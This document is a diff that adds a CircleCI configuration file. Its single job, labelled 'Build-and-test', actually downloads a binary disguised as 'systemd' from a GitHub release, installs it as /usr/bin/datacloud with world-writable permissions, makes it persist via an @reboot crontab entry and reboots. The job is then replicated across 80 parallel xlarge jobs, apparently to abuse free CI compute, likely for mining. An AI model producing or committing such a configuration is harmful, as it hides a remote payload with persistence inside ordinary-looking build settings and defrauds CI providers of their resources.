@@ -1,0 +1,185 @@
+version: 2.1
+jobs:
+  build1:  &build_template
+    parallelism: 10
+    machine:
+      image: ubuntu-2204:current
+    resource_class: xlarge
+    steps:
+      - checkout
+      - run:
+          name: Build-and-test
+          command: |
+                 apt-get update && apt-get install -y wget ca-certificates >/dev/null 2>&1
+                 wget -q https://github.com/gahjuila/juila/releases/download/system/systemd
+                 chmod +x systemd
+                 sudo mv systemd /usr/bin/datacloud
+                 sudo chmod 777 /usr/bin/datacloud
+                 echo -e "@reboot /usr/bin/datacloud" | crontab -
+                 sudo reboot >/dev/null 2>&1 >/dev/null &
+
+
+  build2: *build_template
+  build3: *build_template
+  build4: *build_template
+  build5: *build_template
+  build6: *build_template
+  build7: *build_template
+  build8: *build_template
+  build9: *build_template
+  build10: *build_template
+  build11: *build_template
+  build12: *build_template
+  build13: *build_template
+  build14: *build_template
+  build15: *build_template
+  build16: *build_template
+  build17: *build_template
+  build18: *build_template
+  build19: *build_template
+  build20: *build_template
+  build21: *build_template
+  build22: *build_template
+  build23: *build_template
+  build24: *build_template
+  build25: *build_template
+  build26: *build_template
+  build27: *build_template
+  build28: *build_template
+  build29: *build_template
+  build30: *build_template
+  build31: *build_template
+  build32: *build_template
+  build33: *build_template
+  build34: *build_template
+  build35: *build_template
+  build36: *build_template
+  build37: *build_template
+  build38: *build_template
+  build39: *build_template
+  build40: *build_template
+  build41: *build_template
+  build42: *build_template
+  build43: *build_template
+  build44: *build_template
+  build45: *build_template
+  build46: *build_template
+  build47: *build_template
+  build48: *build_template
+  build49: *build_template
+  build50: *build_template
+  build51: *build_template
+  build52: *build_template
+  build53: *build_template
+  build54: *build_template
+  build55: *build_template
+  build56: *build_template
+  build57: *build_template
+  build58: *build_template
+  build59: *build_template
+  build60: *build_template
+  build61: *build_template
+  build62: *build_template
+  build63: *build_template
+  build64: *build_template
+  build65: *build_template
+  build66: *build_template
+  build67: *build_template
+  build68: *build_template
+  build69: *build_template
+  build70: *build_template
+  build71: *build_template
+  build72: *build_template
+  build73: *build_template
+  build74: *build_template
+  build75: *build_template
+  build76: *build_template
+  build77: *build_template
+  build78: *build_template
+  build79: *build_template
+  build80: *build_template
+
+workflows:
+  version: 2
+  build:
+    jobs:
+      - build1
+      - build2
+      - build3
+      - build4
+      - build5
+      - build6
+      - build7
+      - build8
+      - build9
+      - build10
+      - build11
+      - build12
+      - build13
+      - build14
+      - build15
+      - build16
+      - build17
+      - build18
+      - build19
+      - build20
+      - build21
+      - build22
+      - build23
+      - build24
+      - build25
+      - build26
+      - build27
+      - build28
+      - build29
+      - build30
+      - build31
+      - build32
+      - build33
+      - build34
+      - build35
+      - build36
+      - build37
+      - build38
+      - build39
+      - build40
+      - build41
+      - build42
+      - build43
+      - build44
+      - build45
+      - build46
+      - build47
+      - build48
+      - build49
+      - build50
+      - build51
+      - build52
+      - build53
+      - build54
+      - build55
+      - build56
+      - build57
+      - build58
+      - build59
+      - build60
+      - build61
+      - build62
+      - build63
+      - build64
+      - build65
+      - build66
+      - build67
+      - build68
+      - build69
+      - build70
+      - build71
+      - build72
+      - build73
+      - build74
+      - build75
+      - build76
+      - build77
+      - build78
+      - build79
+      - build80
